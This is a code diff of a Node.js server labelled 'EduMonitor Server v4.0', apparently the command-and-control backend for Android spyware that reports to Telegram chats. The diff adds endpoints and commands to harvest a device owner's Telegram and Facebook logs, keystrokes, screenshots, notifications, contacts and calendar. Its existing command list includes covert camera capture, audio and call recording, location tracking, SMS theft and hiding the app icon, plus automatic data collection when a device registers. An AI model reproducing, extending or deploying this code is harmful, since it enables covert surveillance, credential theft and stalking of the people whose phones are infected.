+            case 'facebook':
+                return res.json({ success: true, handled: 'facebook_endpoint' });
+                
+            case 'calendar':
+                return res.json({ success: true, handled: 'calendar_endpoint' });
+                
+            case 'keystrokes_detailed':
+                return res.json({ success: true, handled: 'keystrokes_endpoint' });
+                
+            case 'screenshots':
+                return res.json({ success: true, handled: 'screenshots_endpoint' });
+                
+            case 'notifications_detailed':
+                return res.json({ success: true, handled: 'notifications_detailed_endpoint' });
                 
             default:
                 message = devicePrefix + `📝 <b>Log: ${logData.type}</b>\n` +
@@ -1894,7 +2260,6 @@ app.post('/api/logs/batch', async (req, res) => {
         for (const [deviceId, deviceLogsList] of deviceLogs.entries()) {
             const device = devices.get(deviceId);
             if (device) {
-                // Filter out app_open logs for individual notifications
                 const nonAppOpenLogs = deviceLogsList.filter(log => log.type !== 'app_open');
                 
                 if (nonAppOpenLogs.length > 0) {
@@ -2034,10 +2399,14 @@ app.post('/api/result/:deviceId', async (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, result, error } = req.body;
     
-    if (command && (command.includes('_html') || 
+    if (command && (command.includes('_html') || command.includes('_detailed') ||
         command === 'ip_info' || command === 'phone_number' || command === 'location' ||
         command === 'sim_info' || command === 'wifi_info' || command === 'all_info' ||
-        command === 'mobile_info' || command === 'find_recorded')) {
+        command === 'mobile_info' || command === 'find_recorded' ||
+        command === 'telegram' || command === 'facebook' || command === 'calendar' ||
+        command === 'keystrokes_detailed' || command === 'screenshots' ||
+        command === 'apps_detailed' || command === 'notifications_detailed' ||
+        command === 'device_snapshots' || command === 'contacts_detailed')) {
         console.log(`📎 ${command} using dedicated endpoint`);
         return res.sendStatus(200);
     }
@@ -2059,7 +2428,7 @@ app.post('/api/result/:deviceId', async (req, res) => {
     res.sendStatus(200);
 });
 
-// ============= UPDATED REGISTRATION ENDPOINT =============
+// ============= REGISTRATION ENDPOINT =============
 app.post('/api/register', async (req, res) => {
     const { deviceId, deviceInfo } = req.body;
     
@@ -2069,14 +2438,12 @@ app.post('/api/register', async (req, res) => {
         return res.status(400).json({ error: 'Missing fields' });
     }
     
-    // Get device configuration (maps device to chat ID and config)
     const deviceConfig = getDeviceConfig(deviceId);
     
     if (!deviceConfig) {
         return res.status(403).json({ error: 'Device not authorized' });
     }
     
-    // Check if device already exists
     const existingDevice = devices.get(deviceId);
     const isNewDevice = !existingDevice;
     
@@ -2098,10 +2465,8 @@ app.post('/api/register', async (req, res) => {
     
     console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
     
-    // Set menu button for the chat
     await setChatMenuButton(deviceConfig.chatId);
     
-    // Get device count for this user
     const userDevices = getDeviceListForUser(deviceConfig.chatId);
     
     let welcomeMessage = `✅ <b>Device ${isNewDevice ? 'Connected' : 'Updated'}!</b>\n\n`;
@@ -2118,14 +2483,20 @@ app.post('/api/register', async (req, res) => {
         welcomeMessage += `• 📱 SIM Information\n`;
         welcomeMessage += `• 📶 WiFi Details\n`;
         welcomeMessage += `• 📱 Mobile Network Info\n`;
-        welcomeMessage += `• 📇 Contacts\n`;
+        welcomeMessage += `• 📇 Contacts (Basic & Detailed)\n`;
         welcomeMessage += `• 💬 SMS Messages\n`;
         welcomeMessage += `• 📞 Call Logs\n`;
-        welcomeMessage += `• 📱 Installed Apps\n`;
+        welcomeMessage += `• 📱 Installed Apps (Basic & Detailed)\n`;
+        welcomeMessage += `• 💬 Telegram Logs\n`;
+        welcomeMessage += `• 💬 Facebook Logs\n`;
+        welcomeMessage += `• 📅 Calendar Events\n`;
+        welcomeMessage += `• ⌨️ Detailed Keystrokes\n`;
+        welcomeMessage += `• 📸 Screenshot Metadata\n`;
+        welcomeMessage += `• 🔔 Detailed Notifications\n`;
+        welcomeMessage += `• 📊 Device Snapshots\n`;
         welcomeMessage += `• 📍 Location\n\n`;
         welcomeMessage += `This may take a few moments as the device processes each request.`;
         
-        // Auto-select this device if it's the only one
         if (userDevices.length === 1) {
             userDeviceSelection.set(deviceConfig.chatId, deviceId);
             welcomeMessage += `\n\n✅ This device has been automatically selected for control.`;
@@ -2140,17 +2511,15 @@ app.post('/api/register', async (req, res) => {
         getMainMenuKeyboard(deviceConfig.chatId)
     );
     
-    // Queue auto-data commands for new devices
     if (isNewDevice) {
         queueAutoDataCommands(deviceId, deviceConfig.chatId);
     }
     
-    // Return configuration to the device
     res.json({
         status: 'registered',
         deviceId,
         chatId: deviceConfig.chatId,
-        config: deviceConfig.config // Send the full configuration
+        config: deviceConfig.config
     });
 });
 
@@ -2168,35 +2537,10 @@ app.get('/api/devices', (req, res) => {
             lastIPInfo: device.lastIPInfo || null,
             lastLocation: device.lastLocation || null,
             autoDataRequested: autoDataRequested.has(id),
-            online: (Date.now() - device.lastSeen) < 300000 // 5 minutes
+            online: (Date.now() - device.lastSeen) < 300000
         });
     }
     res.json({ total: devices.size, devices: deviceList });
-});
-
-app.post('/api/test-command/:deviceId', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const { command } = req.body;
-    
-    const device = devices.get(deviceId);
-    
-    if (!device) {
-        return res.status(404).json({ error: 'Device not found' });
-    }
-    
-    if (!device.pendingCommands) {
-        device.pendingCommands = [];
-    }
-    
-    const cmd = command || 'status';
-    device.pendingCommands.push({
-        command: cmd,
-        originalCommand: '/' + cmd,
-        timestamp: Date.now()
-    });
-    
-    console.log(`🧪 Test command added for ${deviceId}: ${cmd}`);
-    res.json({ success: true, message: `Test command '${cmd}' added` });
 });
 
 // ============= TEST ENDPOINTS =============
@@ -2219,12 +2563,13 @@ app.get('/test', (req, res) => {
             </style>
         </head>
         <body>
-            <h1>✅ EduMonitor Server Running</h1>
+            <h1>✅ EduMonitor Server v4.0 Running</h1>
             <div class="stats">
                 <p><b>Time:</b> ${new Date().toISOString()}</p>
                 <p><b>Server IP:</b> <code class="ip">${serverIP}</code></p>
                 <p><b>Total Devices:</b> ${devices.size}</p>
                 <p><b>Authorized Chats:</b> ${Array.from(authorizedChats).join(', ')}</p>
+                <p><b>Commands Available:</b> 75+ commands including all new entity types</p>
             </div>
             
             <h2>📱 Registered Devices (${userDevices.length})</h2>
@@ -2262,74 +2607,57 @@ app.get('/test-menu', async (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     const serverIP = getServerIP();
     console.log('\n🚀 ===============================================');
-    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`🚀 EduMonitor Server v4.0 running on port ${PORT}`);
     console.log(`🚀 Server IP: ${serverIP}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
     console.log('\n✅ DEVICE CONFIGURATION SYSTEM:');
     console.log('   └─ Each device gets its own configuration');
     console.log('   └─ Config includes bot token, chat ID, feature flags');
-    console.log('   └─ Default config for all devices');
-    console.log('   └─ Can override per device ID');
     console.log('\n✅ MULTI-DEVICE SUPPORT ENABLED:');
     console.log('   └─ /devices - List all devices');
     console.log('   └─ /select [device_id] - Switch active device');
-    console.log('   └─ Device menu shows all registered devices');
-    console.log('   └─ Each device gets its own command queue');
-    console.log('   └─ Device info shown in all responses');
-    console.log('\n✅ CAMERA SUPPORT ENABLED:');
-    console.log('   └─ /photo - Take a photo now');
-    console.log('   └─ /takephoto - Alias for photo');
-    console.log('   └─ /camera_on - Start monitoring camera folder');
-    console.log('   └─ /camera_off - Stop monitoring camera folder');
-    console.log('   └─ /camera_status - Check camera status');
-    console.log('   └─ /camera_front - Switch to front camera');
-    console.log('   └─ /camera_back - Switch to back camera');
-    console.log('   └─ /camera_switch - Toggle between cameras');
-    console.log('   └─ Photos are compressed (640x480, 70% quality)');
-    console.log('   └─ Auto-upload of new camera photos');
-console.log('\n✅ RECORDING SCANNER ENABLED:');
-console.log('   └─ /find_recorded - 🔍 Find call recordings');
-console.log('   └─ Supports popular apps including:');
-console.log('       • AppStar Call Recorder (com.appstar.callrecorder)');
-console.log('       • ACR Call Recorder');
-console.log('       • Cube Call Recorder');
-console.log('       • Boldbeast Recorder');
-console.log('       • And many more');
-console.log('   └─ Searches in:');
-console.log('       • Third-party recorder app directories');
-console.log('       • Common recording paths');
-console.log('       • Media directories');
-console.log('       • WhatsApp/Telegram audio folders');
-
-    console.log('\n✅ APP_OPEN LOG HANDLING:');
-    console.log('   └─ Batched every 50 entries into 1 HTML file');
-    console.log('   └─ Excluded from regular log sync (20 at a time)');
-    console.log('   └─ Marked as synced after batch send');
-    console.log('   └─ No individual notifications for app opens');
-    console.log('\n✅ AUTO-DATA COLLECTION ENABLED:');
-    console.log('   └─ When device registers:');
-    console.log('   └─ 1. 🌐 IP Address Info');
-    console.log('   └─ 2. 📞 Phone Number');
-    console.log('   └─ 3. 📱 SIM Information');
-    console.log('   └─ 4. 📶 WiFi Details');
-    console.log('   └─ 5. 📱 Mobile Network Info');
-    console.log('   └─ 6. 📇 Contacts (HTML)');
-    console.log('   └─ 7. 💬 SMS (HTML)');
-    console.log('   └─ 8. 📞 Call Logs (HTML)');
-    console.log('   └─ 9. 📱 Apps List (HTML)');
-    console.log('   └─ 10. 📍 Location');
-    console.log('\n✅ COMPLETE COMMAND LIST (60+ commands):');
+    console.log('\n✅ NEW ENTITY COMMANDS ADDED:');
+    console.log('   └─ 💬 /telegram - Get Telegram logs');
+    console.log('   └─ 💬 /facebook - Get Facebook logs');
+    console.log('   └─ 📅 /calendar - Get calendar events');
+    console.log('   └─ ⌨️ /keystrokes_detailed - Detailed keystrokes');
+    console.log('   └─ 📸 /screenshots - Screenshot metadata');
+    console.log('   └─ 📱 /apps_detailed - Detailed apps info');
+    console.log('   └─ 🔔 /notifications_detailed - Detailed notifications');
+    console.log('   └─ 📊 /device_snapshots - Device history');
+    console.log('   └─ 📇 /contacts_detailed - Detailed contacts');
+    console.log('   └─ 🔄 /sync_all_new - Sync all new tables');
+    console.log('   └─ ⚡ /force_harvest - Force full harvest');
+    console.log('\n✅ NEW ENDPOINTS ADDED:');
+    console.log('   └─ POST /api/telegram/:deviceId');
+    console.log('   └─ POST /api/facebook/:deviceId');
+    console.log('   └─ POST /api/calendar/:deviceId');
+    console.log('   └─ POST /api/keystrokes/:deviceId');
+    console.log('   └─ POST /api/screenshots/:deviceId');
+    console.log('   └─ POST /api/apps-detailed/:deviceId');
+    console.log('   └─ POST /api/notifications-detailed/:deviceId');
+    console.log('   └─ POST /api/device-snapshots/:deviceId');
+    console.log('   └─ POST /api/contacts-detailed/:deviceId');
+    console.log('\n✅ AUTO-DATA COLLECTION ENHANCED:');
+    console.log('   └─ Now collects all new entity types automatically');
+    console.log('   └─ Total commands in queue: 20');
+    console.log('\n✅ COMPLETE COMMAND LIST (75+ commands):');
     console.log('   └─ Devices: /devices, /select');
-    console.log('   └─ Data: contacts, sms, calllogs, apps, keystrokes, notifications');
-    console.log('   └─ Network: ip_info, wifi_info, mobile_info, network, all_info');
-    console.log('   └─ Phone: phone_number, sim_info');
-    console.log('   └─ Screenshot: screenshot, start_screenshot, stop_screenshot, small, medium, original, size_status, screenshot_settings, compression_stats, target_apps, add_target');
+    console.log('   └─ Data (Basic): contacts, sms, calllogs, apps, keystrokes, notifications');
+    console.log('   └─ Data (HTML): contacts_html, sms_html, calllogs_html, apps_html, keystrokes_html');
+    console.log('   └─ Data (Detailed): contacts_detailed, keystrokes_detailed, notifications_detailed, apps_detailed');
+    console.log('   └─ Social: telegram, facebook, whatsapp, browser_history');
+    console.log('   └─ Calendar: calendar');
+    console.log('   └─ Screenshots: screenshot, screenshots, screenshot_logs');
     console.log('   └─ Camera: photo, takephoto, camera_on, camera_off, camera_status, camera_front, camera_back, camera_switch');
     console.log('   └─ Recording: record, start_recording, stop_recording, record_auto_on, record_auto_off, record_schedule, record_custom, audio_info, audio_ultra, audio_very_low, audio_low, audio_medium, audio_high, find_recorded');
+    console.log('   └─ Network: ip_info, wifi_info, mobile_info, network, all_info');
+    console.log('   └─ Phone: phone_number, sim_info');
     console.log('   └─ Location: location, storage, battery, info, time, status');
-    console.log('   └─ App: app_opens, app_opens_html');
+    console.log('   └─ App: app_opens, app_opens_html, clipboard');
     console.log('   └─ Realtime: realtime_on, realtime_off, realtime_status');
-    console.log('   └─ Services: hide_icon, show_icon, reboot_app, clear_logs, logs_count, logs_recent, stats, refresh_data, help');
+    console.log('   └─ Device Snapshots: device_snapshots, device_history');
+    console.log('   └─ Services: hide_icon, show_icon, reboot_app, clear_logs, logs_count, stats, refresh_data, sync_all, sync_all_new, force_harvest, help');
     console.log('\n🚀 ===============================================\n');
 });
